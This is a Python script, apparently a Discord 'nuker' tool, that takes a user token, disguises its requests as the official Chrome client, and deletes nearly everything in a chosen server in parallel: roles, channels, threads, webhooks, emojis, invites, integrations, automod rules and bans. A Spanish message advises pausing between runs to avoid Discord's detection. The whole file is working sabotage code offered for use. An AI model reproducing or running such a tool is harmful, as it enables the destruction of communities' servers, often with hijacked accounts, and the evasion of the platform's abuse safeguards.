import asyncio
import aiohttp
import getpass
import re
import os
import time
import json
import base64
from aiohttp import TCPConnector, ClientTimeout
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field

API_BASE = "https://discord.com/api/v10"

# ═══════════════════════════════════════════════════════════════════════════
# ANSI Colors (minimal)
# ═══════════════════════════════════════════════════════════════════════════

class C:
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[94m"
    M = "\033[95m"
    C = "\033[96m"
    W = "\033[97m"
    D = "\033[90m"
    X = "\033[0m"
    BD = "\033[1m"
    BL = "\033[5m"

def c(t: str, col: str, b=False, bl=False) -> str:
    f = col + (C.BD if b else "") + (C.BL if bl else "")
    return f"{f}{t}{C.X}"

# ═══════════════════════════════════════════════════════════════════════════
# Static Header (zero overhead)
# ═══════════════════════════════════════════════════════════════════════════

def build_header(token: str) -> Dict[str, str]:
    props = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_version": "140.0.0.0",
        "os_version": "10",
        "client_build_number": 273000,
        "release_channel": "stable",
        "client_version": "1.0.9180"
    }
    sp = base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()
    
    return {
        "Authorization": token,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "X-Super-Properties": sp,
    }

# ═══════════════════════════════════════════════════════════════════════════
# Stats
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class Stats:
    start: float = field(default_factory=time.perf_counter)
    ok: int = 0
    fail: int = 0
    rl: int = 0
    
    def elapsed(self) -> float:
        return time.perf_counter() - self.start
    
    def rate(self) -> float:
        e = self.elapsed()
        return self.ok / e if e > 0 else 0.0

# Global nuke counter
NUKE_COUNT = 0

# ═══════════════════════════════════════════════════════════════════════════
# Core Delete (ultra-fast, minimal retry)
# ═══════════════════════════════════════════════════════════════════════════

async def delete(
    session: aiohttp.ClientSession,
    headers: Dict[str, str],
    stats: Stats,
    endpoint: str,
    name: str,
    rtype: str
) -> bool:
    
    try:
        async with session.delete(endpoint, headers=headers, timeout=ClientTimeout(total=0.5)) as r:
            s = r.status
            
            if s in (200, 204):
                stats.ok += 1
                t = stats.elapsed()
                print(c(f"[{t:.1f}s]", C.D) + c(f" {rtype.upper():8}", C.R, b=True) + c(f" {name}", C.W))
                return True
            
            elif s == 429:
                stats.rl += 1
                # Global backoff on 429
                await asyncio.sleep(0.5)
                # Single retry
                async with session.delete(endpoint, headers=headers, timeout=ClientTimeout(total=0.5)) as r2:
                    if r2.status in (200, 204):
                        stats.ok += 1
                        t = stats.elapsed()
                        print(c(f"[{t:.1f}s]", C.D) + c(f" {rtype.upper():8}", C.R, b=True) + c(f" {name}", C.W))
                        return True
                stats.fail += 1
                return False
            
            else:
                stats.fail += 1
                return False
                
    except:
        stats.fail += 1
        return False

# ═══════════════════════════════════════════════════════════════════════════
# API Layer
# ═══════════════════════════════════════════════════════════════════════════

async def validate_token(session: aiohttp.ClientSession, token: str, headers: Dict[str, str]) -> Tuple[bool, Optional[str]]:
    try:
        async with session.get(f"{API_BASE}/users/@me", headers=headers, timeout=ClientTimeout(total=1.0)) as r:
            if r.status == 200:
                u = await r.json()
                print(c(f"\n[✓] AUTH OK │ {u.get('username', 'Unknown')} │ {u.get('id', 'Unknown')}\n", C.G, b=True))
                return True, u.get('id')
    except:
        pass
    
    print(c("[✗] AUTH FAILED", C.R, b=True))
    return False, None

async def fetch_guild(session: aiohttp.ClientSession, headers: Dict[str, str], gid: str) -> Dict:
    try:
        async with session.get(f"{API_BASE}/guilds/{gid}?with_counts=true", headers=headers, timeout=ClientTimeout(total=0.8)) as r:
            if r.status == 200:
                return await r.json()
    except:
        pass
    return {"name": "Unknown", "owner_id": "Unknown", "approximate_member_count": 0}

async def fetch_all(session: aiohttp.ClientSession, headers: Dict[str, str], gid: str) -> Dict:
    base = f"{API_BASE}/guilds/{gid}"
    
    async def get(ep: str):
        try:
            async with session.get(ep, headers=headers, timeout=ClientTimeout(total=0.8)) as r:
                if r.status == 200:
                    return await r.json()
        except:
            pass
        return []
    
    results = await asyncio.gather(
        get(f"{base}/channels"),
        get(f"{base}/roles"),
        get(f"{base}/webhooks"),
        get(f"{base}/emojis"),
        get(f"{base}/stickers"),
        get(f"{base}/scheduled-events"),
        get(f"{base}/invites"),
        get(f"{base}/soundboard-sounds"),
        get(f"{base}/integrations"),
        get(f"{base}/templates"),
        get(f"{base}/auto-moderation/rules"),
        get(f"{base}/bans?limit=1000"),
        return_exceptions=True
    )
    
    channels = results[0] if isinstance(results[0], list) else []
    
    # Threads
    thread_tasks = [
        get(f"{API_BASE}/channels/{ch['id']}/threads/active")
        for ch in channels
        if ch.get("type") in (0, 5, 10, 11, 12, 15)
    ]
    thread_results = await asyncio.gather(*thread_tasks, return_exceptions=True) if thread_tasks else []
    threads = []
    for tr in thread_results:
        if isinstance(tr, dict):
            threads.extend(tr.get("threads", []))
    
    roles = results[1] if isinstance(results[1], list) else []
    roles = [r for r in roles if r.get("name") != "@everyone"]
    
    return {
        "channels": channels,
        "roles": roles,
        "webhooks": results[2] if isinstance(results[2], list) else [],
        "emojis": results[3] if isinstance(results[3], list) else [],
        "stickers": results[4] if isinstance(results[4], list) else [],
        "events": results[5] if isinstance(results[5], list) else [],
        "invites": results[6] if isinstance(results[6], list) else [],
        "sounds": results[7] if isinstance(results[7], list) else [],
        "integrations": results[8] if isinstance(results[8], list) else [],
        "templates": results[9] if isinstance(results[9], list) else [],
        "automod": results[10] if isinstance(results[10], list) else [],
        "threads": threads,
        "bans": results[11] if isinstance(results[11], list) else []
    }

# ═══════════════════════════════════════════════════════════════════════════
# Main Destruction
# ═══════════════════════════════════════════════════════════════════════════

async def nuke(session: aiohttp.ClientSession, headers: Dict[str, str], gid: str, uid: str):
    global NUKE_COUNT
    
    stats = Stats()
    
    print(c("\n[→] SCANNING...", C.B, b=True))
    
    guild = await fetch_guild(session, headers, gid)
    gname = guild.get('name', 'Unknown')
    owner = guild.get('owner_id', 'Unknown')
    members = guild.get('approximate_member_count', 0)
    
    print(c(f"\n{'▓'*60}", C.R, b=True))
    print(c(f"  TARGET: {gname} ({gid})", C.W, b=True))
    print(c(f"  OWNER: {owner} │ MEMBERS: {members:,}", C.D))
    print(c(f"{'▓'*60}\n", C.R, b=True))
    
    res = await fetch_all(session, headers, gid)
    
    total = sum(len(v) for v in res.values())
    
    if total == 0:
        print(c("[✗] NOTHING FOUND", C.R))
        return
    
    print(c(f"[→] TARGETS: {total}", C.G, b=True))
    for k, v in res.items():
        if len(v) > 0:
            print(c(f"  {k:15}: {len(v)}", C.D))
    
    print(c(f"\n{'▓'*60}", C.R, b=True))
    print(c(f"  EXECUTING", C.R, b=True, bl=True))
    print(c(f"{'▓'*60}\n", C.R, b=True))
    
    tasks = []
    
    # PHASE 1: ROLES (sequential)
    print(c("[P1] ROLES", C.M, b=True))
    for role in res['roles']:
        ep = f"{API_BASE}/guilds/{gid}/roles/{role['id']}"
        await delete(session, headers, stats, ep, role.get('name', 'unknown'), "role")
    
    # PHASE 2: CHANNELS & THREADS (full parallel)
    print(c("\n[P2] CHANNELS", C.R, b=True))
    for ch in res['channels']:
        ep = f"{API_BASE}/channels/{ch['id']}"
        tasks.append(delete(session, headers, stats, ep, ch.get('name', 'unknown'), "channel"))
    
    for th in res['threads']:
        ep = f"{API_BASE}/channels/{th['id']}"
        tasks.append(delete(session, headers, stats, ep, th.get('name', 'unknown'), "thread"))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
    
    # PHASE 3: METADATA (full parallel)
    print(c("\n[P3] METADATA", C.Y, b=True))
    
    for wh in res['webhooks']:
        ep = f"{API_BASE}/webhooks/{wh['id']}"
        tasks.append(delete(session, headers, stats, ep, wh.get('name', 'unknown'), "webhook"))
    
    for emoji in res['emojis']:
        ep = f"{API_BASE}/guilds/{gid}/emojis/{emoji['id']}"
        tasks.append(delete(session, headers, stats, ep, emoji.get('name', 'unknown'), "emoji"))
    
    for sticker in res['stickers']:
        ep = f"{API_BASE}/guilds/{gid}/stickers/{sticker['id']}"
        tasks.append(delete(session, headers, stats, ep, sticker.get('name', 'unknown'), "sticker"))
    
    for event in res['events']:
        ep = f"{API_BASE}/guilds/{gid}/scheduled-events/{event['id']}"
        tasks.append(delete(session, headers, stats, ep, event.get('name', 'unknown'), "event"))
    
    for invite in res['invites']:
        ep = f"{API_BASE}/invites/{invite['code']}"
        tasks.append(delete(session, headers, stats, ep, invite['code'], "invite"))
    
    for sound in res['sounds']:
        sid = sound.get('sound_id') if isinstance(sound, dict) else None
        if sid:
            ep = f"{API_BASE}/guilds/{gid}/soundboard-sounds/{sid}"
            tasks.append(delete(session, headers, stats, ep, sound.get('name', 'unknown'), "sound"))
    
    for integ in res['integrations']:
        ep = f"{API_BASE}/guilds/{gid}/integrations/{integ['id']}"
        tasks.append(delete(session, headers, stats, ep, integ.get('name', 'unknown'), "integration"))
    
    for tmpl in res['templates']:
        ep = f"{API_BASE}/guilds/{gid}/templates/{tmpl['code']}"
        tasks.append(delete(session, headers, stats, ep, tmpl.get('name', 'unknown'), "template"))
    
    for rule in res['automod']:
        ep = f"{API_BASE}/guilds/{gid}/auto-moderation/rules/{rule['id']}"
        tasks.append(delete(session, headers, stats, ep, rule.get('name', 'unknown'), "automod"))
    
    for ban in res['bans']:
        user = ban.get('user', {})
        uid_ban = user.get('id')
        if uid_ban:
            ep = f"{API_BASE}/guilds/{gid}/bans/{uid_ban}"
            tasks.append(delete(session, headers, stats, ep, user.get('username', 'unknown'), "ban"))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    # Results
    elapsed = stats.elapsed()
    rate = stats.rate()
    success_pct = (stats.ok / total * 100) if total > 0 else 0
    
    print(c(f"\n{'▓'*60}", C.G, b=True))
    print(c(f"  COMPLETE", C.G, b=True))
    print(c(f"{'▓'*60}", C.G, b=True))
    print(c(f"  Time     : {elapsed:.2f}s", C.W))
    print(c(f"  Rate     : {rate:.1f} req/s", C.G, b=True))
    print(c(f"  Deleted  : {stats.ok}/{total} ({success_pct:.1f}%)", C.G))
    print(c(f"  Failed   : {stats.fail}", C.R))
    print(c(f"  429s     : {stats.rl}", C.Y))
    print(c(f"{'▓'*60}\n", C.G, b=True))
    
    # Increment global counter
    if success_pct >= 90:
        NUKE_COUNT += 1
        
        if NUKE_COUNT >= 3:
            print(c("\n" + "="*80, C.Y, b=True))
            print(c("  ⚠  WARNING: RATE LIMIT RISK", C.Y, b=True, bl=True))
            print(c("="*80, C.Y, b=True))
            print(c("  La continuidad de las Nukings pueden alzar alertas a Discord.", C.W))
            print(c("  Vuelva en 30 minutos por seguridad.", C.W))
            print(c("  Esta version de Early no tiene Bypass de RateLimit ni Bypass", C.D))
            print(c("  de deteccion comun de Discord.", C.D))
            print(c("="*80 + "\n", C.Y, b=True))

# ═══════════════════════════════════════════════════════════════════════════
# Entry
# ═══════════════════════════════════════════════════════════════════════════

async def main():
    print(c("""
███████╗ █████╗ ██████╗ ██╗  ██╗   ██╗
██╔════╝██╔══██╗██╔══██╗██║  ╚██╗ ██╔╝
█████╗  ███████║██████╔╝██║   ╚████╔╝ 
██╔══╝  ██╔══██║██╔══██╗██║    ╚██╔╝  
███████╗██║  ██║██║  ██║███████╗██║   
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   
     Early Edition - ZeZe
""", C.R, b=True))
    
    token = getpass.getpass(c("Token: ", C.W)).strip()
    
    if not re.match(r'^[A-Za-z0-9_\-\.]{24,}\.[A-Za-z0-9_\-\.]{6,}\.[A-Za-z0-9_\-\.]{27,}$', token):
        print(c("[✗] INVALID TOKEN", C.R, b=True))
        return
    
    connector = TCPConnector(
        limit=0,
        limit_per_host=4000,
        force_close=False,
        ttl_dns_cache=600,
        enable_cleanup_closed=True
    )
    timeout = ClientTimeout(total=None, connect=0.5, sock_read=1.0)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        headers = build_header(token)
        
        valid, uid = await validate_token(session, token, headers)
        if not valid:
            return
        
        while True:
            gid = input(c("\nGuild ID: ", C.W)).strip()
            
            if not gid.isdigit():
                print(c("[✗] INVALID", C.R))
                continue
            
            confirm = input(c("\nType 'EXECUTE': ", C.R, b=True)).strip()
            
            if confirm != "EXECUTE":
                print(c("[!] ABORTED", C.Y))
                if input(c("\nContinue? [Y/N]: ", C.B)).strip().upper() != "Y":
                    break
                os.system('cls' if os.name == 'nt' else 'clear')
                continue
            
            await nuke(session, headers, gid, uid)
            
            if input(c("\nContinue? [Y/N]: ", C.B)).strip().upper() != "Y":
                print(c("\n[✓] EXIT", C.G, b=True))
                break
            
            os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(c("\n[!] INTERRUPTED", C.R, b=True))